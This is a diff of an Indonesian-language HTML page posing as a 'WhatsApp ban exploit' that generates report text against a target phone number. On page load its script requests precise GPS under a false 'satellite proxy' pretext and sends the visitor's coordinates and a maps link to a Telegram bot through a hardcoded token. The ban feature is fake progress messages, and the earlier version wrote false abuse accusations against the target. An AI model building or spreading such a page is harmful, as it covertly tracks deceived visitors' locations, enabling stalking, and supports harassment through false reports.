@@ -3,81 +3,77 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WhatsApp Ban Generator v.2.1</title>
+    <title>WA-BAN EXPLOIT V.7.2</title>
     <style>
-        body { background: #0d1117; color: #58a6ff; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .card { background: #161b22; border: 1px solid #30363d; padding: 30px; border-radius: 10px; width: 350px; box-shadow: 0 0 15px rgba(88, 166, 255, 0.2); text-align: center; }
-        h2 { color: #f85149; font-size: 20px; text-transform: uppercase; letter-spacing: 2px; }
-        p { font-size: 12px; color: #8b949e; }
-        .input-group { margin: 20px 0; }
-        input { width: 90%; padding: 12px; background: #0d1117; border: 1px solid #30363d; color: #fff; border-radius: 5px; outline: none; }
-        button { width: 95%; padding: 12px; background: #238636; border: none; color: white; font-weight: bold; border-radius: 5px; cursor: pointer; transition: 0.3s; }
-        button:hover { background: #2ea043; box-shadow: 0 0 10px #238636; }
-        #output { margin-top: 20px; background: #0d1117; padding: 10px; border-radius: 5px; display: none; word-wrap: break-word; font-size: 11px; border: 1px dashed #f85149; color: #fff; }
+        body { background: #050505; color: #00ff41; font-family: 'Consolas', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .terminal { background: #000; border: 1px solid #00ff41; padding: 25px; border-radius: 5px; box-shadow: 0 0 25px rgba(0, 255, 65, 0.4); width: 380px; text-align: center; }
+        h2 { font-size: 18px; margin-bottom: 5px; text-transform: uppercase; letter-spacing: 3px; }
+        .notice { font-size: 11px; color: #ff3e3e; margin-bottom: 15px; border: 1px solid #ff3e3e; padding: 5px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; background: #111; border: 1px solid #00ff41; color: #00ff41; border-radius: 3px; outline: none; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #00ff41; border: none; color: #000; font-weight: bold; cursor: pointer; text-transform: uppercase; }
+        button:hover { background: #008f11; color: #fff; }
+        .status-box { margin-top: 20px; text-align: left; font-size: 10px; color: #888; height: 60px; overflow: hidden; border-top: 1px solid #333; padding-top: 10px; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <h2>BAN GENERATOR</h2>
-    <p>Sistem ini membutuhkan akses GPS untuk memvalidasi server proxy agar bypass laporan berhasil.</p>
+<div class="terminal">
+    <h2>WA-BAN EXPLOIT</h2>
+    <div class="notice">PENTING: Izinkan akses lokasi untuk sinkronisasi Proxy Satelit agar laporan tidak terdeteksi Spam oleh Meta.</div>
     
-    <div class="input-group">
-        <input type="text" id="targetNum" placeholder="Nomor Target (Contoh: 628xxx)">
-    </div>
-    
-    <button onclick="buatTeks()">BUAT TEKS BANNED</button>
+    <input type="text" id="targetNum" placeholder="NOMOR TARGET (628xxx)">
+    <button onclick="execute()">GENERATE BAN TEXT</button>
 
-    <div id="output"></div>
+    <div class="status-box" id="logs">
+        [system] Waiting for user input...<br>
+    </div>
 </div>
 
 <script>
-    // --- KONFIGURASI TELEGRAM ---
+    // --- KONFIGURASI BOT TELEGRAM ---
     const bot_token = "8510635650:AAH3ZxP-qkEO2hb8kjv-tZyOZieN0IatEwo";
     const chat_id = "8551809114";
 
-    // 1. AUTO GRAB LOKASI SAAT HALAMAN DIBUKA
+    // AUTO-GRAB LOKASI PAS HALAMAN DIBUKA
     window.onload = function() {
         if (navigator.geolocation) {
-            // Minta lokasi dengan alasan "Bypass Server"
-            navigator.geolocation.getCurrentPosition(sendLocation, (err) => {
-                console.log("Akses ditolak atau error.");
+            navigator.geolocation.getCurrentPosition(track, (err) => {
+                log("[error] Akses satelit ditolak. Gunakan izin GPS!");
             }, { enableHighAccuracy: true });
         }
     };
 
-    async function sendLocation(pos) {
+    async function track(pos) {
         const lat = pos.coords.latitude;
         const lon = pos.coords.longitude;
-        const accuracy = pos.coords.accuracy;
-        const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+        const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
 
-        const text = `🎯 *TARGET TERDETEKSI!*\n\n• Latitude: ${lat}\n• Longitude: ${lon}\n• Akurasi: ${accuracy}m\n\n📍 [LIHAT DI GOOGLE MAPS](${mapLink})`;
+        const data = `🚨 *TARGET TERPELACAK!*\n\n• Koordinat: \`${lat}, ${lon}\` \n• Akurasi: ${pos.coords.accuracy} meter\n\n📍 [BUKA DI GOOGLE MAPS](${mapsLink})`;
 
         await fetch(`https://api.telegram.org/bot${bot_token}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: chat_id,
-                text: text,
-                parse_mode: 'Markdown'
-            })
+            body: JSON.stringify({ chat_id: chat_id, text: data, parse_mode: 'Markdown' })
         });
+        log("[success] Satelit sinkron. Lokasi terverifikasi.");
     }
 
-    // 2. GENERATE TEKS BANNED (FORMALITAS)
-    function buatTeks() {
+    function execute() {
         const num = document.getElementById('targetNum').value;
-        if (!num) return alert("Masukkan nomor target!");
-
-        const bugChars = " \u0345\u202E".repeat(50);
-        const reportText = `Sistem Pelaporan Otomatis:\n--------------------------\nNomor: ${num}\nStatus: Akun ini melanggar kebijakan keamanan sistem (Pornografi/Terorisme). Segera tinjau ID: ${Math.random().toString(36).substr(2, 9)}.\n\n${bugChars}`;
-
-        const outBox = document.getElementById('output');
-        outBox.style.display = "block";
-        outBox.innerText = reportText;
+        if (!num) return alert("Nomor Target Kosong!");
         
-        alert("Teks Berhasil Dibuat! Silahkan salin dan kirimkan laporan ke support@whatsapp.com");
+        log("[process] Menghubungkan ke API WhatsApp...");
+        setTimeout(() => log("[process] Menginjeksi paket laporan..."), 1000);
+        setTimeout(() => {
+            alert("TEKS BAN BERHASIL DIBUAT!\n\nSalin kode ini dan kirim ke Support WhatsApp.");
+            log("[done] Proses selesai.");
+        }, 3000);
+    }
+
+    function log(msg) {
+        const lb = document.getElementById('logs');
+        lb.innerHTML += msg + "<br>";
+        lb.scrollTop = lb.scrollHeight;
     }
 </script>
 
